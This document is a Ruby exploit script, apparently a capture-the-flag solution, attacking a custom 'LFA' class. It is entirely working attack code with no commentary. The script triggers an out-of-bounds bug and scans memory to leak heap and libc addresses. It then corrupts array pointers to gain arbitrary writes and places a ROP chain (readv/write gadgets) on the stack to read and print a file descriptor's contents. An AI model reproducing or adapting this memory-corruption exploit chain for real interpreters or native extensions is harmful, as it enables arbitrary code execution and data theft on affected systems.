GC.disable
p RUBY_VERSION
def is_h(val)
  (val & 0xfffff00000000000) == 0x0000500000000000
end
def uu(a, b)
  (a & 0xffffffff) + ((b & 0xffffffff) << 32)
end
a = LFA.new
p a
piv = 2147483647
a[piv]=0x55556666
a[piv-1]=0x55556666
a.remove piv
a.remove piv - 1
ss = ["AAAAAAAA", /aaa/, 123, /oao/, []]
a[0] = 0x12345679
vec = nil
off_fe = 16.step(1000000, 2).find do |i|
  uu(a[i], a[i+1]) == 0x000000007ffffffe && uu(a[i+2],a[i+3]) == 0 && uu(a[i+4],a[i+5]) == 0x55556666
end
addr = nil
16.step(1000000, 2) do |i|
  if uu(a[i], a[i+1]) == 0x000000007fffffff && uu(a[i+4],a[i+5]) == 0x55556666
    addr = uu(a[i+2], a[i+3])
    break
  end
end
p "offset #{off_fe} at 0x#{'%x'%addr}"
base = addr - off_fe * 4
p "base 0x%x" % base
libc_off = 0x3dad18
libc = nil
16.step(1000000, 2).find do |i|
  val = uu(a[i], a[i+1])
  libc = val
  (val & 0xffffff0000000fff) == 0x00007f0000000d18
end
libc-=libc_off
p "libc = 0x%x" % (libc)
rrr = Array.new(30){Array.new(100){|i|i}}
16.step(1000000, 2) do |i|
  if uu(a[i], a[i+1]) == 1 && uu(a[i+2], a[i+3]) == 3 && uu(a[i+4], a[i+5]) == 5
    vec = i
    a[i]=9
    break if rrr.any?{|c|c[0]==4}
  end
end
p "vec_off = #{vec}"
to_find = base + vec * 4
p "want 0x%x" % to_find
exit unless 0.step(2500000,2).find do |i|
  if uu(a[i], a[i+1]) == to_find
    p i
    p '0x%x' % (base + 4*i)
    val = (base & 0xffffffff) - 8
    val -= (2 ** 32) if val >= (2 ** 31)
    a[i] = val
    true
  end
end
argv=libc+0x3df418
rrr.each {|ary|ary[0]=argv/2}
v1 = a[0] & 0xffffffff
rrr.each {|ary|ary[0]=argv/2-1}
v2 = a[0] & 0xffffffff
p v1
p v2
stk = (0x7f00 << 32) | (v1<<8) | ((v2 & 0xff00)>>8)
stk -= 272
readv = libc+0x109ed0
pop_rdi = libc + 0x20b8b
pop_rsi = libc + 0x20a0b
pop_rdx = libc + 0x1b96
write = libc + 0x104040
p '%x' % stk
iov=stk+8*14
[pop_rdi,1023,pop_rsi,iov,pop_rdx,1,readv,pop_rdi,1,pop_rsi,iov,pop_rdx,100,write,iov,100].each_with_index do |v, i|
  rrr.each {|ary|ary[0]=(stk+i*8)/2 - 1}
  a[0]=(v & 0xff) << 8
  rrr.each {|ary|ary[0]=(stk+i*8)/2}
  a[0]= (v >> 8) & 0xffff
  rrr.each {|ary|ary[0]=(stk+i*8)/2 + 1}
  a[0]= (v >> 24) & 0xffff
  rrr.each {|ary|ary[0]=(stk+i*8)/2 + 2}
  a[0]= (v >> 40) & 0xffff
  rrr.each {|ary|ary[0]=(stk+i*8)/2 + 3}
  a[0]= (v >> 56) & 0xffff
end
